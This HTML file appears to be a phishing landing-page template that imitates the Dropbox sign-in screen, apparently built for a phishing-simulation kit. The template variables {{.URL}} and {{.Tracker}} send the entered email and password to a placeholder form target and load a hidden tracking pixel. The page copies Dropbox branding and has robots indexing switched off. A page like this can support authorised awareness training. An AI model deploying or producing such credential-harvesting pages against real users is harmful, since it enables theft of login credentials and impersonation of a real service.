<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Sign in - Dropbox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Atlas Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .login-container { width: 420px; padding: 40px; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { width: 40px; height: 40px; }
        h1 { font-size: 24px; font-weight: 700; color: #1e1919; text-align: center; margin-bottom: 32px; }
        .social-btns { margin-bottom: 24px; }
        .social-btn { width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 10px 16px; border: 1px solid #d5d1cf; border-radius: 8px; font-size: 14px; font-weight: 500; color: #1e1919; background: #fff; cursor: pointer; margin-bottom: 8px; }
        .social-btn:hover { background: #f7f5f2; }
        .social-btn svg { width: 20px; height: 20px; }
        .social-btn.google { background: #fff; }
        .social-btn.apple { background: #000; color: #fff; border-color: #000; }
        .divider { display: flex; align-items: center; margin: 24px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid #d5d1cf; }
        .divider span { padding: 0 16px; font-size: 13px; color: #637282; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 12px 16px; border: 1px solid #d5d1cf; border-radius: 8px; font-size: 16px; outline: none; transition: border-color 0.2s; }
        .form-group input:focus { border-color: #0061fe; }
        .form-group input::placeholder { color: #b4b0ae; }
        .checkbox-row { display: flex; align-items: center; margin-bottom: 20px; }
        .checkbox-row input { margin-right: 8px; }
        .checkbox-row label { font-size: 14px; color: #1e1919; cursor: pointer; }
        .submit-btn { width: 100%; background: #0061fe; color: #fff; border: none; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .submit-btn:hover { background: #004fd4; }
        .links { text-align: center; margin-top: 20px; }
        .links a { font-size: 14px; color: #0061fe; text-decoration: none; display: block; margin-bottom: 8px; }
        .links a:hover { text-decoration: underline; }
        .footer { margin-top: 32px; text-align: center; font-size: 12px; color: #637282; }
        .footer a { color: #637282; text-decoration: none; margin: 0 8px; }
        @media (max-width: 480px) { .login-container { width: 100%; padding: 24px; } }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L0 9.5l12 7.5 12-7.5L12 2zm16 0L16 9.5l12 7.5 12-7.5L28 2zM0 24.5l12 7.5 12-7.5-12-7.5L0 24.5zm28-7.5l-12 7.5 12 7.5 12-7.5-12-7.5zM12 34l12-7.5-12-7.5L0 26.5 12 34z" fill="#0061fe"/></svg>
        </div>
        <h1>Sign in to Dropbox</h1>
        <div class="social-btns">
            <button class="social-btn google">
                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                Continue with Google
            </button>
            <button class="social-btn apple">
                <svg viewBox="0 0 24 24" fill="#fff"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.32 2.32-2.12 4.53-3.74 4.25z"/></svg>
                Continue with Apple
            </button>
        </div>
        <div class="divider"><span>or</span></div>
        <form action="{{.URL}}" method="POST">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email" required autofocus>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember me</label>
            </div>
            <button type="submit" class="submit-btn">Sign in</button>
        </form>
        <div class="links">
            <a href="#">Forgot your password?</a>
            <a href="#">Create an account</a>
        </div>
    </div>
    <div class="footer">
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
    <img src="{{.Tracker}}" style="display:none" alt="">
</body>
</html>
